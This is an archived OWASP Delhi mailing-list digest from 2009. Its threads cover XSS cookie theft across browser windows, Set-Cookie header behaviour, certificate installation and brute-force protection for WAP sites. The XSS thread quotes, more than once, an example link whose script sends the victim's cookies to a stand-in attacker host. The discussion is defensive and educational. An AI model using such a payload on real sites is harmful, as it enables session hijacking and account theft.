+In Win XP SP3 Firefox 3.0.x:
+Firefox maintains only one process, so cookies are shared between all
+windows and tabs.
+
+Karthik
+
+--
+Karthik Muthukrishnan, CISSP ISSAP,
+Information Security  Consultant
+Tata Consultancy Services
+
+
+                                                                           
+             Parmendra Sharma                                              
+             <s.parmendra at gmai                                             
+             l.com>                                                     To 
+             Sent by:                  owasp-delhi at lists.owasp.org         
+             owasp-delhi-bounc                                          cc 
+             es at lists.owasp.or                                             
+             g                                                     Subject 
+                                       [Owasp-delhi] Regarding XSS Issue   
+                                                                           
+             19/03/2009 09:29                                              
+             AM                                                            
+                                                                           
+                                                                           
+                                                                           
+
+
+
+
+Dear all,
+
+I have a little problem regarding XSS and here it is....
+
+To perform an XSS attack an attacker steals cookies (in this case) of an
+already logged in user.
+
+In this scenerio :
+
+-> The user is logged in "VulnerableRealBank.com" website in one browser.
+
+-> Now this user opens his email account in a different browser (and not in
+the new tab of the?above browser) and clicks upon the link given
+
+http://VulnerableRealBank.com/index.php?sessionid=12412412&
+username=<script>document.location='http://attacker
+host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
+
+Now my Questions:
+
+-> Will the script that is reflected back from the vulnerable domain is
+capable to send the cookies to the atttacker that are maintained by the
+first browser.
+
+-> Is?above thing?possible if i says that i am using the browser version
+that do not shares cookies for the same domain requests.
+
+-> Is this the problem that is totally independent from the browsers
+versions and?is only the functionality of the script that is sending
+cookies.
+
+Waiting for your responses :-)
+
+
+--
+Thanks and Regards:
+
+Parmendra Sharma
+Indian Computer Emergency Response Team (CERT-In)
+Ministry of Information Technology
+Government of India
+6 C.G.O Complex
+Lodhi Road
+New Delhi_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+ForwardSourceID:NT0001359A
+
+=====-----=====-----=====
+Notice: The information contained in this e-mail
+message and/or attachments to it may contain 
+confidential or privileged information. If you are 
+not the intended recipient, any dissemination, use, 
+review, distribution, printing or copying of the 
+information contained in this e-mail message 
+and/or attachments to it are strictly prohibited. If 
+you have received this communication in error, 
+please notify us by reply e-mail or telephone and 
+immediately and permanently delete the message 
+and any attachments. Thank you
+
+
+
+
+From pklanka at gmail.com  Fri Mar 20 02:00:38 2009
+From: pklanka at gmail.com (Phani)
+Date: Fri, 20 Mar 2009 11:30:38 +0530
+Subject: [Owasp-delhi] Multiple cookies combined in a single Set-Cookie
+	request
+Message-ID: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>
+
+Hello everyone,
+I am facing a trouble setting multiple cookies combined in a single
+Set-Cookie request. Though following RFC 2109 (
+http://www.faqs.org/rfcs/rfc2109) <http://www.faqs.org/rfcs/rfc2109>, and
+MSDN http://msdn.microsoft.com/en-us/library/aa384321(VS.85).aspx both IE
+and firefox are non-responsive to the multiple cookies set in the single
+Set-Cookie request.
+
+I have tried the following on Apache / IIS Servers. (The type of webserver
+may not be relevant since the Set-Cookie header is one and the same in the
+HTTP responses. It is the browser which is not accepting the multiple
+cookies set)
+
+
+Trial #1
+----Server response----------
+Set-Cookie: a1=b1; a2=b2; a3=b3
+
+----Client cookies-------------
+Cookie: a1=b1
+
+Trial #2
+----Server response----------
+Set-Cookie: a1=b1;a2=b2;a3=b3
+
+----Client cookies-------------
+Cookie: a1=b1
+
+Trial #3 (I thought this would work, since it matches with what is written
+in RFC..
+but instead of creating new cookies, browser is setting the value of a1 to
+be "b1, a2=b2, a3=b3")
+----Server response----------
+Set-Cookie: a1=b1, a2=b2, a3=b3
+Xpad: avoid browser bug
+
+----Client cookies-------------
+Cookie: a1=b1, a2=b2, a3=b3
+
+Could anyone put in any thoughts on this...
+
+
+regards
+Phani Kumar Lanka
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/ee60c030/attachment.html 
+
+From nileshkumar83 at gmail.com  Fri Mar 20 02:06:07 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Fri, 20 Mar 2009 11:36:07 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <f162ba540903182316v7d3c865dpc9cf462609b43ac3@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+	<ee7382370903182248hbb0d4e7l936f0d9a70df0e8d@mail.gmail.com>
+	<f162ba540903182316v7d3c865dpc9cf462609b43ac3@mail.gmail.com>
+Message-ID: <ee7382370903192306h3682697coa91d3f3ffb581907@mail.gmail.com>
+
+Hi Parmendra!
+
+
+>  -> Will the script that is reflected back from the vulnerable domain is
+> capable to send the cookies to the atttacker that are maintained by the
+> first browser.
+>
+>   It depends...I have seen examples when one account can be opened  in *two
+> browsers* simultaneosuly. In that case it is possible to steal the cookies
+> form the *second browser* also. Those are the case of web based mails and
+> other social networking sites. However, financial site must not behave like
+> this way.
+>
+> *Please specify whether browsers are opened within the new tab of the
+> parent browser or a fresh instance of the browser is opened at the marked
+> bold places shown above.
+> *
+>
+>
+
+>From *two browsers* I mean two instances of browser,not two tabs in a parent
+browser.
+Ideally,the application should not let the two browsers hadle the same
+session simultaneously.
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/d8b4ea34/attachment.html 
+
+From s.parmendra at gmail.com  Fri Mar 20 03:08:47 2009
+From: s.parmendra at gmail.com (Parmendra Sharma)
+Date: Fri, 20 Mar 2009 12:38:47 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <ee7382370903192306h3682697coa91d3f3ffb581907@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+	<ee7382370903182248hbb0d4e7l936f0d9a70df0e8d@mail.gmail.com>
+	<f162ba540903182316v7d3c865dpc9cf462609b43ac3@mail.gmail.com>
+	<ee7382370903192306h3682697coa91d3f3ffb581907@mail.gmail.com>
+Message-ID: <f162ba540903200008v6c2cc122m49e7f3e9b1bccc@mail.gmail.com>
+
+Dear All,
+
+After reading comments from different Experts i created a summary for this
+important attack:
+
+*Condition-1*
+
+*Both vulnerable website and e-mail account are opened within the mini tabs
+of the same parent browser:*
+
+In this case as a user clicks upon the crafted link in e-mail either by
+
+> right-clicking and opening it in in New Tab or in New Window
+> just click it simply
+
+In both the cases the XSS attack will occur. Again no matter which browser
+you are using.
+
+*Condition-2*
+
+Both vulnerable website and e-mail account are opened within the Fresh
+Browsers Windows (and no new tab).
+In this case as a user clicks upon the crafted link in e-mail either by
+
+> right-clicking and opening it in in New Tab or in New Window
+> just click it simply
+
+*The attack will occur only if:*
+
+-> A Browser is used which shares cookies for the same domain opened across
+different fresh browsers windows. ie: Chrome and Firefox 3.0.x handles
+cookies in same way even in tabs/Windows.
+
+*However many important websites especially financial do not allow users to
+open two instances of the same site for the same user which is an important
+security feature.*
+**
+*Please let me know if i am wrong at any point.
+*
+On Fri, Mar 20, 2009 at 11:36 AM, <nileshkumar83 at gmail.com> wrote:
+
+> Hi Parmendra!
+>
+>
+>>  -> Will the script that is reflected back from the vulnerable domain is
+>> capable to send the cookies to the atttacker that are maintained by the
+>> first browser.
+>>
+>>   It depends...I have seen examples when one account can be opened  in *two
+>> browsers* simultaneosuly. In that case it is possible to steal the
+>> cookies form the *second browser* also. Those are the case of web based
+>> mails and other social networking sites. However, financial site must not
+>> behave like this way.
+>>
+>> *Please specify whether browsers are opened within the new tab of the
+>> parent browser or a fresh instance of the browser is opened at the marked
+>> bold places shown above.
+>> *
+>>
+>>
+>
+> From *two browsers* I mean two instances of browser,not two tabs in a
+> parent browser.
+> Ideally,the application should not let the two browsers hadle the same
+> session simultaneously.
+>
+> --
+> Thanks & Regards,
+> Nilesh Kumar,
+> Security Specialist | Governance Risk Compliance
+> www.nileshkumar83.blogspot.com
+> www.linkedin.com/in/nileshkumar83
+> Mobile- +91-9891524880
+>
+
+
+
+-- 
+Thanks and Regards:
+
+Parmendra Sharma
+Computer Security Analyst
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/dea1d192/attachment.html 
+
+From gunwant.s at gmail.com  Fri Mar 20 11:32:57 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Fri, 20 Mar 2009 21:02:57 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <OF10EB9E45.4D3C113B-ON6525757F.001CCCE2-6525757F.001CFAC8@tcs.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+	<OF10EB9E45.4D3C113B-ON6525757F.001CCCE2-6525757F.001CFAC8@tcs.com>
+Message-ID: <44b2bd060903200832v2a315182x97f0e6a31820546d@mail.gmail.com>
+
+Excellent information!
+
+Thanks Karthik!!
+
+On Fri, Mar 20, 2009 at 10:46 AM, Karthik Muthukrishnan <
+karthik.muthukrishnan at tcs.com> wrote:
+
+> Whether cookies are shared between browser windows depends on various
+> factors like browser vendor and how the new browser windows is launched.
+> Due to these inconsistencies it is good for web application security
+> professionals to assume that cookies will be shared across browser windows
+> and tabs. As you might all know, cookies will not be shared across browsers
+> from different vendors.
+>
+> Examples:
+>
+> In Win XP SP3 IE7:
+> a. Cookies will be shared if the different browser windows belong to the
+> same process. During normal use, this happens when one right-clicks a link
+> and then chooses new tab or new window.
+> b. Cookies will not be shared if the browser windows belong to separate
+> processes. During normal use, this happens when Internet Explorer icon (in
+> desktop or startmenu) is double clicked.
+>
+> In Win XP SP3 Firefox 3.0.x:
+> Firefox maintains only one process, so cookies are shared between all
+> windows and tabs.
+>
+> Karthik
+>
+> --
+> Karthik Muthukrishnan, CISSP ISSAP,
+> Information Security  Consultant
+> Tata Consultancy Services
+>
+>
+>
+>             Parmendra Sharma
+>             <s.parmendra at gmai
+>             l.com>                                                     To
+>             Sent by:                  owasp-delhi at lists.owasp.org
+>             owasp-delhi-bounc                                          cc
+>             es at lists.owasp.or
+>             g                                                     Subject
+>                                        [Owasp-delhi] Regarding XSS Issue
+>
+>              19/03/2009 09:29
+>             AM
+>
+>
+>
+>
+>
+>
+>
+> Dear all,
+>
+> I have a little problem regarding XSS and here it is....
+>
+> To perform an XSS attack an attacker steals cookies (in this case) of an
+> already logged in user.
+>
+> In this scenerio :
+>
+> -> The user is logged in "VulnerableRealBank.com" website in one browser.
+>
+> -> Now this user opens his email account in a different browser (and not in
+> the new tab of the above browser) and clicks upon the link given
+>
+> http://VulnerableRealBank.com/index.php?sessionid=12412412&
+> username=<script>document.location='http://attacker
+> host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
+>
+> Now my Questions:
+>
+> -> Will the script that is reflected back from the vulnerable domain is
+> capable to send the cookies to the atttacker that are maintained by the
+> first browser.
+>
+> -> Is above thing possible if i says that i am using the browser version
+> that do not shares cookies for the same domain requests.
+>
+> -> Is this the problem that is totally independent from the browsers
+> versions and is only the functionality of the script that is sending
+> cookies.
+>
+> Waiting for your responses :-)
+>
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Indian Computer Emergency Response Team (CERT-In)
+> Ministry of Information Technology
+> Government of India
+> 6 C.G.O Complex
+> Lodhi Road
+> New Delhi_______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+> ForwardSourceID:NT0001359A
+>
+> =====-----=====-----=====
+> Notice: The information contained in this e-mail
+> message and/or attachments to it may contain
+> confidential or privileged information. If you are
+> not the intended recipient, any dissemination, use,
+> review, distribution, printing or copying of the
+> information contained in this e-mail message
+> and/or attachments to it are strictly prohibited. If
+> you have received this communication in error,
+> please notify us by reply e-mail or telephone and
+> immediately and permanently delete the message
+> and any attachments. Thank you
+>
+>
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+
+
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/743902e2/attachment-0001.html 
+
+From gunwant.s at gmail.com  Fri Mar 20 12:10:24 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Fri, 20 Mar 2009 21:40:24 +0530
+Subject: [Owasp-delhi] Multiple cookies combined in a single Set-Cookie
+	request
+In-Reply-To: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>
+References: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>
+Message-ID: <44b2bd060903200910n7b657c5cvdf0c8f385182370c@mail.gmail.com>
+
+Hi,
+
+Some concerns about your questions..
+
+1-What is the difference between Trial#1 and Trial#2 ?
+2-And are you saying that browsers in general don't set multiple cookies?
+3-What programming language are you using?
+
+-Gunwant
+
+2009/3/20 Phani <pklanka at gmail.com>
+
+> Hello everyone,
+> I am facing a trouble setting multiple cookies combined in a single
+> Set-Cookie request. Though following RFC 2109 (
+> http://www.faqs.org/rfcs/rfc2109) <http://www.faqs.org/rfcs/rfc2109>, and
+> MSDN http://msdn.microsoft.com/en-us/library/aa384321(VS.85).aspx<http://msdn.microsoft.com/en-us/library/aa384321%28VS.85%29.aspx> both
+> IE and firefox are non-responsive to the multiple cookies set in the single
+> Set-Cookie request.
+>
+> I have tried the following on Apache / IIS Servers. (The type of webserver
+> may not be relevant since the Set-Cookie header is one and the same in the
+> HTTP responses. It is the browser which is not accepting the multiple
+> cookies set)
+>
+>
+> Trial #1
+> ----Server response----------
+> Set-Cookie: a1=b1; a2=b2; a3=b3
+>
+> ----Client cookies-------------
+> Cookie: a1=b1
+>
+> Trial #2
+> ----Server response----------
+> Set-Cookie: a1=b1;a2=b2;a3=b3
+>
+> ----Client cookies-------------
+> Cookie: a1=b1
+>
+> Trial #3 (I thought this would work, since it matches with what is written
+> in RFC..
+> but instead of creating new cookies, browser is setting the value of a1 to
+> be "b1, a2=b2, a3=b3")
+> ----Server response----------
+> Set-Cookie: a1=b1, a2=b2, a3=b3
+> Xpad: avoid browser bug
+>
+> ----Client cookies-------------
+> Cookie: a1=b1, a2=b2, a3=b3
+>
+> Could anyone put in any thoughts on this...
+>
+>
+> regards
+> Phani Kumar Lanka
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/1bf57c58/attachment.html 
+
+From gunwant.s at gmail.com  Fri Mar 20 14:31:24 2009
+From: gunwant.s at gmail.com (Gunwant Singh)
+Date: Sat, 21 Mar 2009 00:01:24 +0530
+Subject: [Owasp-delhi] Multiple cookies combined in a single Set-Cookie
+	request
+In-Reply-To: <e74e68850903200920n67f1ba82u7e87cdd9b10e850f@mail.gmail.com>
+References: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>
+	<44b2bd060903200910n7b657c5cvdf0c8f385182370c@mail.gmail.com>
+	<e74e68850903200920n67f1ba82u7e87cdd9b10e850f@mail.gmail.com>
+Message-ID: <44b2bd060903201131i66272624pfce19ea8e22a3919@mail.gmail.com>
+
+Just curious, what would you get if you set multiple cookies like this:
+
+header("Set-this: abc");
+header("Set-that: def");
+
+instead of
+
+header("Set-cookie: a1=b1");
+header("Set-cookie: a2=b2");
+
+Let us know if you are able to set cookies this way?
+
+It may be a language-independent bug, have a look:
+
+1. http://bugs.php.net/bug.php?id=16803
+2. http://bugs.php.net/bug.php?id=42273
+
+-Gunwant
+
+On Fri, Mar 20, 2009 at 9:50 PM, Phani <pklanka at gmail.com> wrote:
+
+>
+>
+> On Fri, Mar 20, 2009 at 9:40 PM, Gunwant Singh <gunwant.s at gmail.com>wrote:
+>
+>> Hi,
+>>
+>> Some concerns about your questions..
+>>
+>> 1-What is the difference between Trial#1 and Trial#2 ?
+>
+>
+> Nothing much.. Just removed spaces between the individual cookies. Some
+> random hit and try :)
+>
+>
+>>
+>> 2-And are you saying that browsers in general don't set multiple cookies?
+>
+>
+> Not exactly. Multiple cookies are set by issuing multiple Set-Cookie
+> requests. But I need to merge all the cookie requests into one set-cookie
+> request.
+>
+>
+>>
+>> 3-What programming language are you using?
+>
+>
+> Actually I tried the same with .NET, PHP. But again I believe the the
+> program does not matter as such; if the same HTTP response headers are
+> generated again and again.
+>
+>
+> Hope I answered your queries..
+>
+> -pl
+>
+>
+>>
+>> -Gunwant
+>>
+>> 2009/3/20 Phani <pklanka at gmail.com>
+>>
+>>>  Hello everyone,
+>>> I am facing a trouble setting multiple cookies combined in a single
+>>> Set-Cookie request. Though following RFC 2109 (
+>>> http://www.faqs.org/rfcs/rfc2109) <http://www.faqs.org/rfcs/rfc2109>,
+>>> and MSDN http://msdn.microsoft.com/en-us/library/aa384321(VS.85).aspx<http://msdn.microsoft.com/en-us/library/aa384321%28VS.85%29.aspx> both
+>>> IE and firefox are non-responsive to the multiple cookies set in the single
+>>> Set-Cookie request.
+>>>
+>>> I have tried the following on Apache / IIS Servers. (The type of
+>>> webserver may not be relevant since the Set-Cookie header is one and the
+>>> same in the HTTP responses. It is the browser which is not accepting the
+>>> multiple cookies set)
+>>>
+>>>
+>>> Trial #1
+>>> ----Server response----------
+>>> Set-Cookie: a1=b1; a2=b2; a3=b3
+>>>
+>>> ----Client cookies-------------
+>>> Cookie: a1=b1
+>>>
+>>> Trial #2
+>>> ----Server response----------
+>>> Set-Cookie: a1=b1;a2=b2;a3=b3
+>>>
+>>> ----Client cookies-------------
+>>> Cookie: a1=b1
+>>>
+>>> Trial #3 (I thought this would work, since it matches with what is
+>>> written in RFC..
+>>> but instead of creating new cookies, browser is setting the value of a1
+>>> to be "b1, a2=b2, a3=b3")
+>>> ----Server response----------
+>>> Set-Cookie: a1=b1, a2=b2, a3=b3
+>>> Xpad: avoid browser bug
+>>>
+>>> ----Client cookies-------------
+>>> Cookie: a1=b1, a2=b2, a3=b3
+>>>
+>>> Could anyone put in any thoughts on this...
+>>>
+>>>
+>>> regards
+>>> Phani Kumar Lanka
+>>>
+>>> _______________________________________________
+>>> Owasp-delhi mailing list
+>>> Owasp-delhi at lists.owasp.org
+>>> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>>>
+>>>
+>>
+>>
+>> --
+>> Gunwant Singh
+>>
+>>
+>
+
+
+-- 
+Gunwant Singh
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090321/ab4e1a2e/attachment.html 
+
+From nileshkumar83 at gmail.com  Fri Mar 20 11:44:14 2009
+From: nileshkumar83 at gmail.com (nileshkumar83 at gmail.com)
+Date: Fri, 20 Mar 2009 21:14:14 +0530
+Subject: [Owasp-delhi] Regarding XSS Issue
+In-Reply-To: <f162ba540903200008v6c2cc122m49e7f3e9b1bccc@mail.gmail.com>
+References: <f162ba540903182059xf8f0ef7q87de5bc37ec3c13c@mail.gmail.com>
+	<ee7382370903182248hbb0d4e7l936f0d9a70df0e8d@mail.gmail.com>
+	<f162ba540903182316v7d3c865dpc9cf462609b43ac3@mail.gmail.com>
+	<ee7382370903192306h3682697coa91d3f3ffb581907@mail.gmail.com>
+	<f162ba540903200008v6c2cc122m49e7f3e9b1bccc@mail.gmail.com>
+Message-ID: <ee7382370903200844n668c13abh2c886015526e985e@mail.gmail.com>
+
+Yes Parmendra....you got it right!!
+
+2009/3/20 Parmendra Sharma <s.parmendra at gmail.com>
+
+> Dear All,
+>
+> After reading comments from different Experts i created a summary for this
+> important attack:
+>
+> *Condition-1*
+>
+> *Both vulnerable website and e-mail account are opened within the mini
+> tabs of the same parent browser:*
+>
+> In this case as a user clicks upon the crafted link in e-mail either by
+>
+> > right-clicking and opening it in in New Tab or in New Window
+> > just click it simply
+>
+> In both the cases the XSS attack will occur. Again no matter which browser
+> you are using.
+>
+> *Condition-2*
+>
+> Both vulnerable website and e-mail account are opened within the Fresh
+> Browsers Windows (and no new tab).
+> In this case as a user clicks upon the crafted link in e-mail either by
+>
+> > right-clicking and opening it in in New Tab or in New Window
+> > just click it simply
+>
+> *The attack will occur only if:*
+>
+> -> A Browser is used which shares cookies for the same domain opened across
+> different fresh browsers windows. ie: Chrome and Firefox 3.0.x handles
+> cookies in same way even in tabs/Windows.
+>
+> *However many important websites especially financial do not allow users
+> to open two instances of the same site for the same user which is an
+> important security feature.*
+> **
+> *Please let me know if i am wrong at any point.
+> *
+>   On Fri, Mar 20, 2009 at 11:36 AM, <nileshkumar83 at gmail.com> wrote:
+>
+>> Hi Parmendra!
+>>
+>>
+>>>  -> Will the script that is reflected back from the vulnerable domain is
+>>> capable to send the cookies to the atttacker that are maintained by the
+>>> first browser.
+>>>
+>>>   It depends...I have seen examples when one account can be opened  in *two
+>>> browsers* simultaneosuly. In that case it is possible to steal the
+>>> cookies form the *second browser* also. Those are the case of web based
+>>> mails and other social networking sites. However, financial site must not
+>>> behave like this way.
+>>>
+>>> *Please specify whether browsers are opened within the new tab of the
+>>> parent browser or a fresh instance of the browser is opened at the marked
+>>> bold places shown above.
+>>> *
+>>>
+>>>
+>>
+>> From *two browsers* I mean two instances of browser,not two tabs in a
+>> parent browser.
+>> Ideally,the application should not let the two browsers hadle the same
+>> session simultaneously.
+>>
+>> --
+>> Thanks & Regards,
+>> Nilesh Kumar,
+>> Security Specialist | Governance Risk Compliance
+>> www.nileshkumar83.blogspot.com
+>> www.linkedin.com/in/nileshkumar83
+>> Mobile- +91-9891524880
+>>
+>
+>
+>
+> --
+> Thanks and Regards:
+>
+> Parmendra Sharma
+> Computer Security Analyst
+>
+> _______________________________________________
+> Owasp-delhi mailing list
+> Owasp-delhi at lists.owasp.org
+> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>
+>
+
+
+-- 
+Thanks & Regards,
+Nilesh Kumar,
+Security Specialist | Governance Risk Compliance
+www.nileshkumar83.blogspot.com
+www.linkedin.com/in/nileshkumar83
+Mobile- +91-9891524880
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/0d3f293f/attachment.html 
+
+From pklanka at gmail.com  Fri Mar 20 12:20:33 2009
+From: pklanka at gmail.com (Phani)
+Date: Fri, 20 Mar 2009 21:50:33 +0530
+Subject: [Owasp-delhi] Multiple cookies combined in a single Set-Cookie
+	request
+In-Reply-To: <44b2bd060903200910n7b657c5cvdf0c8f385182370c@mail.gmail.com>
+References: <e74e68850903192300p217a5f31vad0ec823ded9c650@mail.gmail.com>
+	<44b2bd060903200910n7b657c5cvdf0c8f385182370c@mail.gmail.com>
+Message-ID: <e74e68850903200920n67f1ba82u7e87cdd9b10e850f@mail.gmail.com>
+
+On Fri, Mar 20, 2009 at 9:40 PM, Gunwant Singh <gunwant.s at gmail.com> wrote:
+
+> Hi,
+>
+> Some concerns about your questions..
+>
+> 1-What is the difference between Trial#1 and Trial#2 ?
+
+
+Nothing much.. Just removed spaces between the individual cookies. Some
+random hit and try :)
+
+
+>
+> 2-And are you saying that browsers in general don't set multiple cookies?
+
+
+Not exactly. Multiple cookies are set by issuing multiple Set-Cookie
+requests. But I need to merge all the cookie requests into one set-cookie
+request.
+
+
+>
+> 3-What programming language are you using?
+
+
+Actually I tried the same with .NET, PHP. But again I believe the the
+program does not matter as such; if the same HTTP response headers are
+generated again and again.
+
+
+Hope I answered your queries..
+
+-pl
+
+
+>
+> -Gunwant
+>
+> 2009/3/20 Phani <pklanka at gmail.com>
+>
+>> Hello everyone,
+>> I am facing a trouble setting multiple cookies combined in a single
+>> Set-Cookie request. Though following RFC 2109 (
+>> http://www.faqs.org/rfcs/rfc2109) <http://www.faqs.org/rfcs/rfc2109>, and
+>> MSDN http://msdn.microsoft.com/en-us/library/aa384321(VS.85).aspx<http://msdn.microsoft.com/en-us/library/aa384321%28VS.85%29.aspx> both
+>> IE and firefox are non-responsive to the multiple cookies set in the single
+>> Set-Cookie request.
+>>
+>> I have tried the following on Apache / IIS Servers. (The type of webserver
+>> may not be relevant since the Set-Cookie header is one and the same in the
+>> HTTP responses. It is the browser which is not accepting the multiple
+>> cookies set)
+>>
+>>
+>> Trial #1
+>> ----Server response----------
+>> Set-Cookie: a1=b1; a2=b2; a3=b3
+>>
+>> ----Client cookies-------------
+>> Cookie: a1=b1
+>>
+>> Trial #2
+>> ----Server response----------
+>> Set-Cookie: a1=b1;a2=b2;a3=b3
+>>
+>> ----Client cookies-------------
+>> Cookie: a1=b1
+>>
+>> Trial #3 (I thought this would work, since it matches with what is written
+>> in RFC..
+>> but instead of creating new cookies, browser is setting the value of a1 to
+>> be "b1, a2=b2, a3=b3")
+>> ----Server response----------
+>> Set-Cookie: a1=b1, a2=b2, a3=b3
+>> Xpad: avoid browser bug
+>>
+>> ----Client cookies-------------
+>> Cookie: a1=b1, a2=b2, a3=b3
+>>
+>> Could anyone put in any thoughts on this...
+>>
+>>
+>> regards
+>> Phani Kumar Lanka
+>>
+>> _______________________________________________
+>> Owasp-delhi mailing list
+>> Owasp-delhi at lists.owasp.org
+>> https://lists.owasp.org/mailman/listinfo/owasp-delhi
+>>
+>>
+>
+>
+> --
+> Gunwant Singh
+>
+>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090320/1c47a218/attachment.html 
+
+From abhishek_mpec at rediffmail.com  Sat Mar 21 12:13:54 2009
+From: abhishek_mpec at rediffmail.com (abhishek singh)
+Date: 21 Mar 2009 16:13:54 -0000
+Subject: [Owasp-delhi] Firefox certificate installation
+Message-ID: <20090321161354.21003.qmail@f4mail-234-234.rediffmail.com>
+
+  
+hiiii
+i've created my own CA certificate as well as server & client certificate using openssl commands. i kept all these certificates (server.p12, client.pem, ca.crt) in a folder on my desktop.I'm using Fedora system.
+now the problem is that i want to install these certs through java program. (i dont want to follow firefox-Edit-preferences-advance-encryption-view certificate-import).
+how can i do this,..???
+
+
+
+Regards
+Abhishek Singh
+09742388418
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090321/f388921d/attachment.html 
+
+From sameer.garg at gmail.com  Thu Mar 26 05:12:35 2009
+From: sameer.garg at gmail.com (Sameer Garg)
+Date: Thu, 26 Mar 2009 14:42:35 +0530
+Subject: [Owasp-delhi] Securing WAP sites
+Message-ID: <45c0a77b0903260212x4aa65d34u35fbe0f2e487f7e7@mail.gmail.com>
+
+Hi All,
+
+How would we go about securing a WAP site against turing test. There
+are couple of challenges that we face.
+
+1. We can't prompt the user with Captcha based on the number of
+attempts from an IP address because many GPRS providers use a proxy.
+
+2. Cookies? How do they help when launching a Brute Force without
+submitting cookies?
+
+Sameer
+
+From lavakumar.kuppan at rbs.com  Fri Mar 27 08:27:38 2009
+From: lavakumar.kuppan at rbs.com (lavakumar.kuppan at rbs.com)
+Date: Fri, 27 Mar 2009 17:57:38 +0530
+Subject: [Owasp-delhi] Securing WAP sites
+In-Reply-To: <45c0a77b0903260212x4aa65d34u35fbe0f2e487f7e7@mail.gmail.com>
+Message-ID: <OFD6C62232.D5664623-ON65257586.0043967C-65257586.00448D46@abnamro.com>
+
+Sameer, I dont understand what you mean by protection against 'Turing 
+Test'.
+If you are looking at protection against automated password-guessing 
+attacks then its pretty simple.
+The counter to display a captha or lock the account is not based on the IP 
+or the cookie.
+It depends on the user account.
+If you get lets say five failed login attempts on a particular username 
+then act on it, dont even bother with the IP and cookie.
+
+If you were looking for something else then it might help to give more 
+details.
+
+Thanks and Regards,
+Lavakumar K
+
+
+
+
+Sameer Garg <sameer.garg at gmail.com> 
+Sent by: owasp-delhi-bounces at lists.owasp.org
+03/26/2009 02:42 PM
+
+To
+owasp-delhi at lists.owasp.org
+cc
+
+Subject
+[Owasp-delhi] Securing WAP sites
+
+
+
+
+
+
+Hi All,
+
+How would we go about securing a WAP site against turing test. There
+are couple of challenges that we face.
+
+1. We can't prompt the user with Captcha based on the number of
+attempts from an IP address because many GPRS providers use a proxy.
+
+2. Cookies? How do they help when launching a Brute Force without
+submitting cookies?
+
+Sameer
+_______________________________________________
+Owasp-delhi mailing list
+Owasp-delhi at lists.owasp.org
+https://lists.owasp.org/mailman/listinfo/owasp-delhi
+
+
+
+This message (including any attachments) is confidential and may be privileged. If you have received it by mistake please notify the sender by return e-mail and delete this message from your system. Any unauthorised use or dissemination of this message in whole or in part is strictly prohibited. Please note that e-mails are susceptible to change. ABN AMRO Central Enterprise Services Pvt Ltd, part of RBS Group plc , having its registered office at Empire Complex, 414 Senapati Bapat Marg, Lower Parel (W), Mumbai - 400 013 , including its group companies, shall not be liable for the improper or incomplete transmission of the information contained in this communication nor for any delay in its receipt or damage to your system. ABN AMRO Central Enterprise Services Pvt Ltd (or its group companies) does not guarantee that the integrity of this communication has been maintained nor that this communication is free of viruses, interceptions or interference.
+
+______________________________________________________________________
+This email has been scanned by the MessageLabs Email Security System.
+For more information please visit http://www.messagelabs.com/email 
+______________________________________________________________________
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: https://lists.owasp.org/pipermail/owasp-delhi/attachments/20090327/81938716/attachment.html 
+
+From Venkatesh.Jagannathan at cognizant.com  Fri Mar 27 09:19:03 2009
